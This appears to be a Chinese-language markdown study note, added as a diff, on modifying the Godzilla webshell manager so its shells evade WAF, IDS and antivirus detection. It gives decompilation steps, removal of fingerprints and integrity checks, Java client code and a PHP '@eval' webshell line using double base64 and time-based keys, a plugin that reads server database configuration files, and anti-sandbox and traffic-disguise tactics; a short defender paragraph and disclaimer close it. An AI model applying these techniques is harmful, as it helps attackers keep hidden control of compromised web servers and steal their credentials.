@@ -1,0 +1,226 @@
+## 1. 概述
+
+本文档是一份关于 WebShell 免杀对抗技术的深度学习笔记，重点围绕主流的 WebShell 管理工具“哥斯拉 (Godzilla)”进行二次开发与魔改。内容涵盖了从反编译、指纹特征修改、通信协议增强，到实现数据混淆、动态密钥和功能插件扩展等一系列高级对抗技巧。
+
+本文旨在提供一个系统性的魔改思路和技术实现路径，帮助安全研究人员和红队工程师理解并掌握如何绕过常见的流量监测和终端防御系统 (如 WAF、IDS/IPS)，提升 WebShell 的隐蔽性和生命周期。
+
+---
+
+## 2. 技术原理
+
+现代安全产品对 WebShell 的检测主要依赖于以下几个维度：
+
+*   **静态特征检测：** 扫描文件内容，匹配已知的 WebShell 脚本特征码、危险函数（如 `eval`, `assert`, `system`）和加密函数（如 `base64_decode`）。
+*   **动态行为分析：** 在沙箱中执行脚本，监控其行为，如文件操作、命令执行、网络连接等异常活动。
+*   **流量特征分析：** 检测 C2 (Command & Control) 通信流量中的固定特征，例如固定的 User-Agent、特定的请求/响应体结构、加密方式的指纹等。
+*   **HASH 值校验：** 对比文件的哈希值与已知恶意文件的哈希库。
+
+我们的魔改思路正是针对以上检测机制，通过个性化定制，消除或混淆这些可被识别的“指纹”，从而达到免杀和持久化的目的。
+
+---
+
+## 3. 环境准备
+
+在开始魔改之前，请确保您已准备好以下开发环境和工具：
+
+*   **Java Development Kit (JDK):** 推荐使用 JDK 1.8 或更高版本，与哥斯拉项目构建环境一致。
+*   **IntelliJ IDEA:** 强大的 Java 集成开发环境，其内置的 Java Decompiler 功能非常出色。
+*   **哥斯拉原版 JAR 文件:** 本文以 `godzilla.jar` 4.x 版本为例。
+*   **基础知识:** 具备 Java 编程、PHP/JSP/ASP.NET 脚本语言基础以及 HTTP 协议知识。
+
+---
+
+## 4. 实战示例：魔改哥斯拉 4.x
+
+### 4.1. 反编译与项目重建
+
+第一步是将已编译的 `.jar` 文件还原为可编辑的源代码项目。
+
+1.  **使用 IDEA 反编译:**
+    虽然有在线反编译工具，但强烈建议使用 IntelliJ IDEA 的内置反编译器或其插件，以获得更完整、更准确的源代码。可以通过命令行执行反编译操作：
+
+    ```bash
+    # 语法: java -cp "[IDEA插件路径]/java-decompiler.jar" org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler [选项] [输入文件/目录] [输出目录]
+    # 示例路径，请根据您的实际安装位置修改
+    d:\JDK17\bin\java.exe -cp "D:/IntelliJ IDEA 2025.2.3/plugins/java-decompiler/lib/java-decompiler.jar" org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -dgs=true godzilla.jar godzillasrc
+    ```
+
+2.  **创建新项目并导入源码:**
+    *   在 IDEA 中创建一个新的 Java 项目。
+    *   将反编译后 `godzillasrc` 目录下的源代码复制到新项目的 `src` 目录中。
+    *   创建 `lib` 目录，并将哥斯拉运行所需的依赖库（如果有）放入其中。
+    *   配置项目构建设置 (Project Structure)，确保设置了正确的 SDK，并将 `lib` 目录下的 JAR 文件添加为项目依赖。
+    *   在 `Run/Debug Configurations` 中设置或在 `Artifacts` 中配置工件 (Artifact)，指定主类 (Main Class) 为 `core.ui.MainActivity`，以便能够打包和运行。
+
+### 4.2. 消除指纹特征
+
+默认的哥斯拉客户端和 Shell 脚本存在大量固定指纹，是流量审计和静态分析的重点关注对象。
+
+*   **修改默认 HTTP Headers:**
+    哥斯拉的默认 User-Agent 和 Accept 头字段是强特征。我们需要将其修改为更常见或完全自定义的值。
+    *   **定位代码:** `core.ui.component.frame.ShellSetting.java`
+    *   **修改方法:** 在 `initAddShellValue` 和 `initUpdateShellValue` 方法中，找到设置 HTTP 头的代码，将其默认值更改。
+    *   **定位代码:** `util.http.HttpResponse.java`
+    *   **修改方法:** 检查 `handleHeader` 方法，确保没有硬编码的头部信息。
+
+    ```java
+    // 示例：在 ShellSetting.java 中修改默认 User-Agent
+    this.httpHeaderTextField.setText("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36\nAccept: */*\nAccept-Language: en-US,en;q=0.9");
+    ```
+
+*   **修改界面与版权信息:**
+    为防止被识别，可以修改界面的标题、关于信息等。
+    *   **定位代码:** `core.ui.MainActivity.java`
+    *   **修改方法:** 查找并替换窗口标题、版权字符串等。
+
+*   **去除 HASH 验证:**
+    哥斯拉可能包含对自身或核心组件的完整性校验，这会妨碍我们的修改。
+    *   **定位代码:** `core.ApplicationConfig.java`
+    *   **修改方法:** 查找与 `md5`, `hash`, `verify` 相关的逻辑，并将其注释或直接返回 `true`。
+
+### 4.3. 通信协议增强
+
+#### 4.3.1. 混淆通信数据
+
+默认的 `payload` 经过一次 `base64` 或 `xor` 加密后传输，这种模式很容易被检测。我们可以通过增加加密层数来混淆数据。
+
+*   **客户端修改 (Java):**
+    以 PHP 的 `base64` 载荷为例，我们对数据进行两次 `base64` 编码。
+    *   **定位代码:** `shells.cryptions.php.PhpXor.java` (或其他加密器)
+    *   **修改方法:** `E` (加密) 方法
+
+    ```java
+    // 原始加密逻辑 (简化)
+    /*
+    public byte[] E(byte[] cs) throws Exception {
+        // ... XOR 加密 ...
+        String base64Str = functions.base64EncodeToString(cs);
+        String urlEncodeStr = URLEncoder.encode(base64Str, "UTF-8");
+        return (this.pass + "=" + urlEncodeStr).getBytes();
+    }
+    */
+
+    // 修改后的二次 Base64 混淆逻辑
+    public byte[] E(byte[] cs) throws Exception {
+        // 保持原有的 XOR 加密
+        for (int i = 0; i < cs.length; ++i) {
+            cs[i] ^= this.key[i + 1 & 15];
+        }
+
+        // 第一次 Base64 编码
+        String firstBase64 = functions.base64EncodeToString(cs);
+        // 新增：第二次 Base64 编码（核心修改点）
+        String secondBase64 = functions.base64EncodeToString(firstBase64.getBytes("UTF-8"));
+        // URL 编码（针对二次 Base64 的结果）
+        String urlEncodeStr = URLEncoder.encode(secondBase64, "UTF-8");
+        // 拼接最终格式并转为字节数组
+        return (this.pass + "=" + urlEncodeStr).getBytes();
+    }
+    ```
+
+*   **服务端 Shell 模板修改 (PHP):**
+    相应地，WebShell 模板也需要进行两次 `base64_decode`。
+    *   **定位代码:** `shells/payloads/php/base64.bin` (这是模板文件，需要修改其对应的生成逻辑或直接修改模板内容)
+
+    ```php
+    // 原始解密逻辑
+    // @eval(base64_decode($_POST['pass']));
+
+    // 修改后的二次解密逻辑
+    // 注意：这里的变量名 $qianxin... 是哥斯拉动态生成的，核心是嵌套调用
+    // $payload = base64_decode(base64_decode($_POST['pass']));
+    // @eval($payload);
+
+    // 在哥斯拉模板中的体现形式（以随机变量名为例）
+    @eval($qianxinITUfjjXmxo2($qianxinITUfjjXmxo2($_POST[$qianxinw7hJzkKxyi])));
+    ```
+
+#### 4.3.2. 实现动态通信密钥
+
+固定的密钥或由固定字符串生成的密钥容易被破解。我们可以使用一个动态的、双方都能计算但第三方难以预测的值作为密钥，例如基于时间的动态密钥。
+
+*   **服务端 Shell 模板修改 (PHP):**
+    让 Shell 使用当前时间的某个特定格式的 MD5 值作为密钥。
+
+    ```php
+    // 使用 substr(md5(date("l,d F Y H:i")), 0, 16) 作为密钥
+    // l: 星期几的全称, d: 月份中的第几天, F: 月份全称, Y: 四位数年份, H: 24小时制小时, i: 分钟
+    // 例如 "Friday,20 March 2026 03:48"
+    session_start();
+    @set_time_limit(0);
+    $key = substr(md5(date("l,d F Y H:i")), 0, 16);
+    $_SESSION['key'] = $key;
+    $post = file_get_contents("php://input");
+    // ...后续解密逻辑使用 $key
+    ```
+    > **注意:** 这种方式存在1分钟的时间窗口。客户端和服务器的请求必须在同一分钟内完成，否则密钥不匹配。这增加了安全性，但也可能导致连接失败。
+
+*   **客户端修改 (Java):**
+    客户端必须以完全相同的方式生成密钥。
+
+    ```java
+    import java.text.SimpleDateFormat;
+    import java.util.Date;
+    import java.util.Locale;
+    import java.security.MessageDigest;
+
+    // ... 在加密器类中 ...
+
+    // this.key = this.shell.getSecretKeyX().getBytes(); // 原始获取密钥方式
+
+    // 新的动态密钥生成逻辑
+    SimpleDateFormat sdf = new SimpleDateFormat("EEEE,dd MMMM yyyy HH:mm", Locale.ENGLISH);
+    String dateStr = sdf.format(new Date());
+    String md5Str = md5(dateStr); // md5() 是一个自定义的MD5哈希函数
+    String keyStr = md5Str.substring(0, 16);
+    this.key = keyStr.getBytes();
+
+    // 工具方法：MD5 哈希计算
+    public static String md5(String s) {
+        try {
+            MessageDigest md = MessageDigest.getInstance("MD5");
+            byte[] bytes = md.digest(s.getBytes("UTF-8"));
+            StringBuilder result = new StringBuilder();
+            for (byte b : bytes) {
+                result.append(String.format("%02x", b));
+            }
+            return result.toString();
+        } catch (Exception e) {
+            e.printStackTrace();
+            return "";
+        }
+    }
+    ```
+
+### 4.4. 新增与修改功能插件
+
+哥斯拉的插件系统提供了极佳的扩展性。我们可以修改现有插件或创建新插件来满足特定需求。
+
+*   **示例：新增“数据库配置扫描”功能**
+    我们可以利用 WebShell 已有的文件系统访问能力，编写一个插件来自动扫描常见的数据库配置文件路径。
+    1.  **定位插件代码:**
+        *   客户端逻辑: `shells/plugins/php/PPortScan.java` (可以参考此结构)
+        *   服务端脚本: `shells/plugins/php/assets/PortScan.php` (可以参考此结构)
+    2.  **创建新插件:**
+        *   **客户端 (Java):** 创建一个新的插件类，如 `PScanDbConfig.java`，实现插件接口，定义一个按钮。点击按钮时，向服务端发送一个执行特定扫描任务的请求。
+        *   **服务端 (PHP):** 在 `assets` 目录下创建一个对应的 `ScanDbConfig.php` 脚本。该脚本接收请求，定义一个包含常见配置文件路径的数组（如 `config.php`, `wp-config.php`, `database.yml` 等），然后遍历这些路径进行文件读取尝试，并将结果返回给客户端。
+
+---
+
+## 5. 关键细节
+
+*   **代码混淆:** 在完成功能修改后，可以对 Java 客户端代码和 PHP Shell 模板进行混淆，进一步增加逆向分析的难度。
+*   **模板分离:** 将 WebShell 的核心逻辑（如 `eval`）与载荷分离，通过 `include` 或其他方式远程加载，可以绕过静态文件扫描。
+*   **反沙箱技术:** 在 Shell 脚本中加入环境检测逻辑，例如判断 `$_SERVER` 变量、检查特定函数是否存在等，如果在沙箱环境中则不执行恶意行为。
+*   **流量伪装:** 将通信流量伪装成正常的业务流量，例如模拟成图片请求（`image/gif`）、JS 文件请求或正常的 API 调用，将加密数据隐藏在看似合法的参数或 Cookie 中。
+
+---
+
+## 6. 安全总结
+
+通过对哥斯拉等 WebShell 管理工具进行深度魔改，我们可以有效地突破传统基于特征的防御体系。核心思想在于 **“消除标准化，拥抱个性化”**。任何固定的、可被模式化的特征都可能成为被检测的弱点。
+
+对于防御方而言，这也揭示了仅依赖静态特征和固定流量规则的局限性。未来的防御体系需要更加关注 **行为基线分析 (UEBA)**、**异常流量检测** 和 **内存马检测** 等更高级的技术，通过监控服务器的异常进程、不寻常的文件操作和网络连接来发现未知和经过混淆的 WebShell 攻击。攻防双方的对抗将持续在这种动态博弈中升级。
+
+---
+> **免责声明:** 本文档仅用于技术研究和学习目的，严禁用于任何非法活动。任何因滥用本文档内容而导致的法律后果，由使用者自行承担。
